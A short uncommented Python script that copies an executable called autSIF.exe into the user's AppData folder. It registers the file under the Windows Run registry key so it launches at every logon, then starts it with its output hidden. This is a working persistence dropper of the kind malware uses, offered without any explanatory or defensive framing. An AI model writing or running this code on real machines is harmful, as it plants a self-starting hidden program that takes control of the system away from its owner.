import os, shutil, subprocess

user = os.getlogin()
ruta = f'C:\\Users\\{user}\\AppData\\autSIF.exe'
if not os.path.exists(ruta):
 shutil.copy("autSIF.exe", ruta)
reg=f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v autSIF /t REG_SZ /d {ruta} /f'
subprocess.run(reg, shell=True)
subprocess.Popen(ruta, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
